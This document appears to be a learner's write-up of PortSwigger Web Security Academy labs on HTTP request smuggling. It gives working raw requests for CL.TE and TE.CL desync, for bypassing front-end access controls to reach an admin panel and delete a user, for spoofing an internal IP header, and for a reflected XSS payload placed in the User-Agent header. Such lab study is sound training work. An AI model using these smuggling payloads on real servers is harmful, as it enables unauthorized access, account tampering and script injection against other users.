## Lab - 1: HTTP request smuggling, basic CL.TE vulnerability (P)

- This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method. To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

- send this request twice

```
POST / HTTP/1.1
Host: 0a540036047255c3c3ba1b66004300fe.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

- front end server will accept all and back end will execute only 0 and G is left for the first request and G is appended to the second request and will get an error

---

## Lab - 2: HTTP request smuggling, basic TE.CL vulnerability (P)

- This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method. To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

```
POST / HTTP/1.1
Host: 0ae3007c043a9f14c0d3485f00be006d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

- Two `Enter` after 0 is important.

---

## Lab - 3: HTTP request smuggling, obfuscating the TE header (P)

- This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method. To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

```
POST / HTTP/1.1
Host: 0a0a00840493184ac0ff04e2006f00db.web-security-academy.net
Content-Length: 4
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Connection: keep-alive

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

---

# How to find

## Lab - 4: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses (P)

- This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.

```
POST / HTTP/1.1
Host: 0af100d70385f333c058ad5600e2006b.web-security-academy.net
Content-Type: application/x-www-url-encoded
Content-Length: 49
Transfer-Encoding: chunked
Connection: keep-alive

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

---

## Lab - 5: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses (P)

- This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.

```
POST / HTTP/1.1
Host: 0a2e00ff03831e78c0cdfb08007d0015.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

9e
GET /404 HTTP/1.1
Host: 0a2e00ff03831e78c0cdfb08007d0015.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0


```

---

# How to exploit

## Lab - 6: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability (P)

- This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it. To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.

1. Try with

```
POST / HTTP/1.1
Host: 0a580008041199f1c0149c21007c00cb.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

- get 401 unauthorized

2.

```
POST / HTTP/1.1
Host: 0a580008041199f1c0149c21007c00cb.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Foo: x
```

- Duplicate header names are not allowed

3.

```
POST / HTTP/1.1
Host: 0a580008041199f1c0149c21007c00cb.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

- get the admin panel
- change the `GET /admin/delete?username=carlos` to solve the lab

---

## Lab - 7: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability (P)

- This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it. To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.

```
POST / HTTP/1.1
Host: 0a4500fe0382d950c0fda60a000d0074.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

x=4
0


```

- front end is TE and send all the requests to the backend
- backend is CL and in the first request, until 87 is processed and the rest are remained for the next round
- 87 is hexadecimal which is 135 characters from GET /admin/... to x=4

---

## Lab - 8: Exploiting HTTP request smuggling to reveal front-end request rewriting (P)

- This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name. To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.

- first test whether it is CL.TE or TE.CL and found that it is CL.TE
- there is a search parameter in POST request and reflect back
- to find which Header is responsible for IP address

```
POST / HTTP/1.1
Host: 0a2f0099043dcdb4c0540ef900180013.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0a2f0099043dcdb4c0540ef900180013.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

search=
```

- and found that

```html
<h1>
  0 search results for 'POST / HTTP/1.1 X-emLLFy-Ip: 117.55.250.47 Host:
  0a2f0099043dcdb4c0540ef900180013.web-security-academy.net Connection:
  keep-alive Content-Type: application/x-www-form-urlencoded Content-Le'
</h1>
```

- after trying a little bit

```
POST / HTTP/1.1
Host: 0a2f0099043dcdb4c0540ef900180013.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-emLLFy-Ip: 127.0.0.1
Content-Length: 10

x=
```

---

## Lab - 9: Exploiting HTTP request smuggling to deliver reflected XSS (P)

- This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The application is also vulnerable to reflected XSS via the User-Agent header. To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1).

- first test whether it is CL.TE or TE.CL and found that it is CL.TE
- reflected XSS at blog post

```
GET /post?postId=6 HTTP/1.1
Host: 0a2c00dc04f32b66c0ca5d6a00a1007f.web-security-academy.net
Cookie: session=9f2vhd8TNaAfhvoCf8KskhVhpn7kIVeJ
User-Agent: "/><script>alert(1)</script>
...
```

```
POST / HTTP/1.1
Host: 0a2c00dc04f32b66c0ca5d6a00a1007f.web-security-academy.net
User-Agent: a'<script>alert(1)%3b</script>
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 197
Transfer-Encoding: chunked

0

GET /post?postId=6 HTTP/1.1
Host: 0a2c00dc04f32b66c0ca5d6a00a1007f.web-security-academy.net
Cookie: session=9f2vhd8TNaAfhvoCf8KskhVhpn7kIVeJ
User-Agent: "/><script>alert(1)</script>
Foo: x
```

---

## Lab - 10: H2.CL request smuggling (P)

- This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, perform a request smuggling attack that causes the victim's browser to load a malicious JavaScript file from the exploit server and call alert(document.cookie). The victim user accesses the home page every 10 seconds.
